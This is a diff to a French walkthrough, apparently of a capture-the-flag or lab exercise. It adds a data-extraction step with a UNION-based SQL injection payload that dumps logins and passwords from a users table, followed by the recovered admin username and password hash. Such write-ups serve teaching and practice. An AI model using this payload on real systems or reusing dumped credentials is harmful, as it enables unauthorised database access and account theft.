@@ -311,6 +311,16 @@ On liste les colonnes de la table avec l'injection SQL suivante :
 ![On liste les colonnes](images/list_columns.png)
 
 
-## 
+## Extraction de données
 
-![](images/creds.png)
+Une fois que l'on a les tables, et les noms de colonnes. On peut récupérer le hash de l'administateur.
+```SQL
+2 UNION SELECT NULL,group_concat(login,0x7c,password),'ccc',NULL FROM users LIMIT 1,1;-- 
+```
+
+![On récupère finalement un couple login / mot de passe](images/creds.png)
+
+Identifiants :
+```
+admin:8efe310f9ab3efeae8d410a8e0166eb2
+```
